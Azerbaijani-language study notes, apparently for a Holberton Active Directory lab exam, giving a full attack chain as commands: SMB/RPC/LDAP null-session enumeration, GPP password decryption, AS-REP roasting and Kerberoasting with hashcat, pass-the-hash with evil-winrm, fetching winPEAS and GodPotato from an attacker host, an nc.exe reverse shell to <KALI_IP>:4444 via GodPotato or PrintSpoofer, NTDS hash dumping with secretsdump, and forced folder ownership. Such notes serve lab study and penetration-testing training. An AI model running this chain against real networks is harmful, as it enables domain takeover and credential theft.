---

```markdown
# 🏰 Active Directory Eksploytasiya Qeydləri - Hissə 1 (Recon & Initial Access)

Bu sənəd Active Directory (AD) şəbəkələrində məlumat toplamaq, zəif konfiqurasiyaları tapmaq (SMB/LDAP/RPC) və ilkin giriş (Kerberoasting, AS-REP) əldə etmək üçün addım-addım bələdçidir.

---

## 📌 1. Əsas Hədəf Portları və Kəşfiyyat (Host Discovery)

AD mühitində hansı servislərin işlədiyini bilmək hücumun istiqamətini təyin edir.

| Port | Servis | İmtahanda Əhəmiyyəti |
| :--- | :--- | :--- |
| **88** | Kerberos | Bura Domain Controller (DC) olduğunu təsdiqləyir. |
| **139 / 445** | SMB | Fayl paylaşımları və null session (şifrəsiz) axtarışı üçün ilk hədəf. |
| **389 / 636** | LDAP / LDAPS | Domen istifadəçilərini və atributlarını çəkmək üçün əsas yol. |
| **5985 / 5986** | WinRM | Şifrəni və ya Hash-i tapdıqdan sonra terminal (shell) əldə etmək üçün. |

**Nmap ilə Kəşfiyyat:**
```bash
# Sadəcə aktiv cihazları tapmaq üçün
sudo nmap -sn 10.129.235.185 -oA host_alive

# Portları və OS/Domen məlumatlarını çıxarmaq üçün tam skan
sudo nmap -sC -sV -p 88,139,389,445,5985 -T4 -Pn 10.129.235.185 -oA full_scan

```

---

## 📂 2. SMB Enumeration və GPP (Qrup Siyasəti) Şifrələrinin Oğurlanması

İlk addım hər zaman SMB paylaşımlarına (Shares) **şifrəsiz (Anonymous/Null Session)** girməyə çalışmaqdır.

### A. Paylaşımların Siyahılanması və Kəşfiyyat

```bash
# Host adı, domen və SMB vəziyyətini öyrənmək (Çox vacibdir)
netexec smb 10.129.235.185

# Şifrəsiz (Null Session) paylaşımları siyahılamaq
netexec smb 10.129.235.185 -u '' -p '' --shares
smbclient -L //10.129.235.185 -N

# enum4linux-ng ilə bütün məlumatların avtomatik toplanması
enum4linux-ng -A 10.129.235.185

```

### B. SMB Paylaşımına Daxil Olmaq və Oxumaq

```bash
# Hər hansı bir paylaşıma şifrəsiz girmək
smbclient -N //10.129.235.185/Replication

# Daxil olduqdan sonra faylları çəkmək üçün komandalar:
smb: \> ls          # Faylları göstərir
smb: \> cd folder   # Qovluğa daxil olur
smb: \> get flag.txt # Tək faylı yükləyir
smb: \> prompt OFF  # Təsdiqləməni ləğv edir
smb: \> mget * # Qovluqdakı hər şeyi yükləyir

```

### C. GPP (Group Policy Preferences) Şifrəsinin Sındırılması

Bəzən adminlər `SYSVOL` qovluğunda şifrələri saxlayırlar. `Groups.xml` faylını axtarın.

```bash
# Paylaşım daxilində (və ya endirdikdən sonra) Groups.xml faylını axtarmaq
find . -name Groups.xml
cat Groups.xml  # Daxilindəki 'cpassword' dəyərini tap

# Tapılan cpassword-u qırmaq (Kali-də daxili alətlə)
gpp-decrypt "TAPILAN_CPASSWORD_DEYERI"

```

---

## 🕵️‍♂️ 3. LDAP və RPC Kəşfiyyatı (Holberton Taskı Üçün Xüsusi Metod)

**⚠️ DİQQƏT:** Holberton layihəsində bayraq (flag) adətən istifadəçi obyektinin standart yoxlamalarda görünməyən gizli atributlarında (`description`, `comment`, `user_parameters`) gizlədilir. Buna görə RPC kəşfiyyatı mütləqdir.

### A. RPCClient ilə Daxili Atributların Çəkilməsi (Holberton Method)

Windows sistemləri istifadəçiləri adla deyil, **RID** (Relative ID) ilə tanıyır. `rpcclient` vasitəsilə RIDs tapıb dərin atributları oxuyuruq:

```bash
# 1. Şifrəsiz (Null Session) RPC-yə qoşulmaq
rpcclient -U "" -N 10.129.235.185

# 2. Bütün istifadəçiləri və onların RID nömrələrini siyahılamaq
rpcclient $> enumdomusers
# Nəticə: user:[svc_backup] rid:[0x468]

# 3. Şübhəli (xüsusilə svc_ ilə başlayan) istifadəçilərin DƏRİN məlumatını oxumaq
rpcclient $> queryuser 0x468

```

*Məsləhət: `queryuser` komandasından sonra ekranda `comment`, `description` və ya `user_parameters` hissələrində gizlənmiş şifrələri və ya flag-ləri axtarın.*

### B. LDAP Kəşfiyyatı (Domen haqqında ümumi məlumat)

Bütün bazanı çəkib daxilində "password" sözünü axtarmaq üçün:

```bash
# Domain adını (Base DN) öyrənmək
ldapsearch -H ldap://10.129.235.185 -x -s base namingcontexts

# Bütün istifadəçiləri və onların qeydlərini (description) çəkmək
ldapsearch -H ldap://10.129.235.185 -x -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description

# Bütün LDAP məlumatını fayla yazıb şifrə axtarmaq
ldapsearch -H ldap://10.129.235.185 -x -b "DC=domain,DC=local" > ldap_dump.txt
grep -i "description\|pass\|pwd\|cred" ldap_dump.txt

```

---

## 🔥 4. İlkin Giriş: Kerberoasting və AS-REP Roasting

Əgər əlinizdə hər hansı bir keçərli istifadəçi adı və şifrə varsa (və ya ümumiyyətlə yoxdursa), bu hücumlarla administrator hesablarının Hash-lərini çəkə bilərsiniz. *Bunun üçün `impacket` alətləri istifadə olunur.*

### A. AS-REP Roasting (Şifrə Tələb Etmir!)

Bəzi istifadəçilərdə "Do not require Kerberos preauthentication" aktiv olur. Bu zaman bizə şifrə lazım deyil, sadəcə istifadəçi siyahısı bəs edir.

```bash
# 1. İstifadəçi adlarını users.txt faylına yığın
# 2. Hash-ləri çəkin:
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip 10.129.235.185 -outputfile asrep.hash

# 3. Hash-i qırmaq (Hashcat Mode: 18200)
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

```

### B. Kerberoasting (İstənilən sadə istifadəçi şifrəsi tələb edir)

Əgər əlinizdə ən aşağı səlahiyyətli bir istifadəçinin belə şifrəsi varsa, SPN (Service Principal Name) təyin olunmuş yüksək səlahiyyətli xidmət hesablarının (`svc_tgs`, `svc_backup`) TGS biletlərini çəkə bilərsiniz.

```bash
# 1. Kerberoasting üçün TGS biletlərini (Hash) çəkmək
impacket-GetUserSPNs domain.local/svc_tgs:SizinTapdiginizSifre -request -dc-ip 10.129.235.185 -outputfile kerb.hash

# 2. Hash-i qırmaq (Hashcat Mode: 13100)
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
# Və ya John the Ripper ilə:
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash

```

---

## 💻 5. Sistemə Giriş (Evil-WinRM Shell)

Şifrəni (və ya Hash-i) tapdıqdan sonra hədəf sistemin terminalına daxil olmaq üçün ən təmiz yol **evil-winrm**-dir. (Port 5985 açıq olmalıdır).

```bash
# Şifrə ilə giriş:
evil-winrm -i 10.129.235.185 -u "İstifadəçiAdı" -p "Şifrə123!"

# Əgər əlinizdə yalnız NTLM Hash varsa (Pass-The-Hash metodu):
evil-winrm -i 10.129.235.185 -u "Administrator" -H "b817733bdc947930b700cc2e567fb3ad"

# Evil-WinRM daxilində faydalı əmrlər:
*evil-winrm* PS C:\> upload /home/kali/tool.exe   # Fayl yükləyir
*evil-winrm* PS C:\> download C:\flag.txt        # Faylı öz kompüterinə çəkir
*evil-winrm* PS C:\> menu                        # Əlavə menyunu açır

```

```
---

```markdown
# 🏰 Active Directory Eksploytasiya Qeydləri - Hissə 2 (PrivEsc & Post-Exploitation)

Bu sənəd sistemə `evil-winrm` və ya başqa bir yolla daxil olduqdan sonra səlahiyyətləri yüksəltmək (Privilege Escalation), domen administratorunun hash-ini çəkmək və sistemdəki qorunan məlumatları (Flag) oxumaq üçün istifadə edilən texnikaları əhatə edir.

---

## 🚀 6. Səlahiyyət Yüksəltməsi (Privilege Escalation) və Kəşfiyyat

Sistemə daxil olan kimi ilk edəcəyiniz iş hansı xüsusi icazələrə sahib olduğunuzu yoxlamaqdır. Xidmət hesabları (`svc_`) adətən arxa planda işləmək üçün yüksək imtiyazlara malik olur.

### A. İcazələrin Yoxlanılması
```bash
# Səlahiyyətləri görmək üçün
whoami /priv

```

**Axtardığınız qızıl açar:** Siyahıda `SeImpersonatePrivilege` (və ya `SeAssignPrimaryTokenPrivilege`) icazəsinin **Enabled** olduğunu görməlisiniz. Bu icazə bizə `SYSTEM` hesabına keçməyə imkan verir.

### B. winPEAS ilə Avtomatlaşdırılmış Kəşfiyyat (Əgər manuel tapılmazsa)

Zəiflikləri avtomatik tapmaq üçün Kali-dən hədəfə `winPEAS` yükləyib işlədirik:

```bash
# 1. Kali-də alətlərin olduğu qovluqda HTTP server aç:
python3 -m http.server 80

# 2. Hədəf maşında (evil-winrm daxilində) faylı yüklə və işlət:
curl http://<KALI_IP>/winPEASx64.exe -o winPEASx64.exe
.\winPEASx64.exe

```

---

## 🥔 7. SeImpersonate İstismarı (GodPotato & PrintSpoofer)

Bu icazəni istismar etmək üçün ən yaxşı alətlər **GodPotato** (bütün yeni Windows versiyaları üçün) və **PrintSpoofer**-dir (Windows 10 / Server 2019 və daha köhnələr üçün).

### A. Alətlərin Hədəfə Yüklənməsi

```bash
# Evil-WinRM-in daxili 'upload' əmri ilə birbaşa yükləyə bilərsiniz:
upload /usr/share/windows-resources/binaries/nc.exe
upload /home/kali/tools/GodPotato-NET4.exe

# Və ya PowerShell (curl/iwr) ilə yükləmək:
certutil -urlcache -f http://<KALI_IP>/GodPotato-NET4.exe GodPotato.exe

```

### B. GodPotato ilə SYSTEM Səlahiyyətinə Qalxmaq

GodPotato-nun işlədiyini yoxlamaq üçün test əmri:

```bash
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
# Əgər nəticə 'nt authority\system' çıxarsa, TƏBRİKLƏR!

```

### C. Geri Bağlantı (Reverse Shell) Əldə Etmək

Ən rahat işləmək üçün öz Kali maşınımıza SYSTEM səlahiyyətli bir shell göndəririk:

```bash
# 1. Kali maşınında dinləyici (listener) aç:
nc -lvnp 4444

# 2. Hədəf maşında GodPotato və nc.exe vasitəsilə shell göndər:
.\GodPotato-NET4.exe -cmd "cmd /c nc.exe -e cmd <KALI_IP> 4444"

```

*Alternativ olaraq PrintSpoofer istifadə edilərsə:*
`.\PrintSpoofer64.exe -c "cmd /c nc.exe <KALI_IP> 4444 -e cmd"`

---

## 🔑 8. Domenin Ələ Keçirilməsi (Hash Dumping)

Artıq `SYSTEM` olduğumuz üçün (və ya əgər əlimizdə yüksək səlahiyyətli istifadəçi şifrəsi varsa) Active Directory-nin ürəyi sayılan **NTDS.dit** faylından bütün istifadəçilərin (xüsusilə **Administrator**) Hash-lərini çəkə bilərik.

Bunun üçün Kali-dən `impacket-secretsdump` istifadə edirik:

```bash
# Etibarlı istifadəçi adı və şifrə ilə bütün domen hash-lərini tökmək:
impacket-secretsdump PENTESTLAB.local/svc_backup:Sifre123@<TARGET_IP>

# Əgər əlimizdə yalnız Hash varsa (Pass-The-Hash ilə dump etmək):
impacket-secretsdump PENTESTLAB.local/Administrator@<TARGET_IP> -hashes :<ADMIN_NTLM_HASH>

```

*Nəticədə ekrana `Administrator:500:aad3b...:b817733bdc947930b700cc2e567fb3ad:::` formatında hash-lər töküləcək. Bizə lazım olan hissə sonuncu NTLM hash-dir.*

---

## 🏁 9. Pass-The-Hash və Flag-in Oxunması

Administrator hash-ini tapdıqdan sonra onu sındırmağa (crack) ehtiyac yoxdur! **Pass-The-Hash** texnikası ilə birbaşa sistemə daxil ola bilərik.

### A. Administrator Kimi Daxil Olmaq

```bash
# Evil-WinRM ilə hash istifadə edərək daxil olmaq:
evil-winrm -i <TARGET_IP> -u Administrator -H "b817733bdc947930b700cc2e567fb3ad"

# SMB vasitəsilə Administrator kimi C$ qovluğuna daxil olmaq:
smbclient //<TARGET_IP>/C$ -U "Administrator" --pw-nt-hash b817733bdc947930b700cc2e567fb3ad

```

### B. Flag-in (Bayrağın) Oxunması (Holberton Məhdudiyyətləri)

Bəzən hətta Administrator belə olsanız, bəzi qovluqlara (məsələn: `C:\DCSync_Proof`) girməyə icazə verilmir. Bunun qarşısını almaq üçün **Ownership (Sahiblik)** hüquqlarını zorla üzərinizə götürməlisiniz:

```bash
# 1. Qovluğun (və daxilindəki faylların) sahibliyini zorla almaq:
takeown /F C:\DCSync_Proof /R

# 2. SYSTEM və ya Administrator hesabına tam icazə (Full Control) vermək:
icacls C:\DCSync_Proof /grant SYSTEM:F /T

# 3. İndi flag-i rahatlıqla oxumaq olar:
type C:\DCSync_Proof\flag.txt

```

---

## 🎯 10. Tam Hücum Zənciri Xülasəsi (Attack Flow)

İmtahanda itməmək üçün beynində bu zənciri qur:

1. `Nmap / netexec` -> Portları və SMB paylaşımlarını tap.
2. `rpcclient / ldapsearch` -> Gizli atributları (description/comment) və istifadəçiləri çək.
3. `Kerberoasting / AS-REP` -> Hash çək və `hashcat` ilə qır (və ya GPP `Groups.xml` tap).
4. `evil-winrm` -> Tapdığın şifrə ilə sistemə daxil ol.
5. `whoami /priv` -> `SeImpersonate` icazəsini təsdiqlə.
6. `GodPotato` -> SYSTEM shell əldə et.
7. `secretsdump` -> Administrator NTLM Hash-ini çək.
8. `Pass-The-Hash` -> Admin kimi yenidən daxil ol.
9. `takeown / icacls` -> Qovluq icazələrini qır və Root Flag-i oxu!

```
